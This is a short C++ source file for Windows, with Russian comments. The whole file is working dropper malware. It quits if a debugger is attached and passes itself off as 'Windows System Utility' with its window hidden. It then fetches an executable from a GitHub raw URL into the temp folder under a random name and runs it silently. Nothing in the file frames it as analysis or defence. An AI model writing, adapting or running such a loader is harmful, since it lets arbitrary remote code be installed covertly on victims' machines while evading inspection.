#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <wininet.h>
#include <urlmon.h>
#include <iostream>
#include <string>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wininet.lib")

using namespace std;

int main() {
    
    if (IsDebuggerPresent()) {
        exit(-1);
    }

    
    SetConsoleTitleW(L"Windows System Utility");
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // проверка интернета
    if (!InternetCheckConnectionW(L"https://google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {
        return 1;
    }

    // получаем временную папку
    wchar_t tempPath[MAX_PATH];
    if (GetTempPathW(MAX_PATH, tempPath) == 0) return 1;

    // рандомим имя файла
    wchar_t randomName[16];
    swprintf(randomName, 16, L"sys%08x.exe", GetTickCount());
    wstring savePath = tempPath + wstring(randomName);

    // прямой URL для скачивания файла с GitHub
    const wchar_t* github_url = L"https://raw.githubusercontent.com/wh0ami-hash/test-with-crypt/main/Autoruns.exe";

    // скачка
    HRESULT result = URLDownloadToFileW(NULL, github_url, savePath.c_str(), 0, NULL);
    if (result != S_OK) return 1;

    // Запускаем файл скрытно
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (CreateProcessW(savePath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 0;
}